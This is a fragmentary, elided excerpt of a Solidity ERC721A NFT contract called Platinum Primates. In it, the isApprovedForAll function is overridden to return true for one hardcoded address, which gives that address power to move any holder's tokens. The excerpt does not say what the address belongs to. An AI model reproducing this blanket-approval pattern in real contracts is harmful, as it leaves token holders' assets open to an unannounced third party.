  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x09a213392CEFd6745e23AA0fe903fbE94e589daD){return true;}
...
contract Platinum_Primates is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Platinum Primates", "PLAT", maxBatchSize_, collectionSize_) {
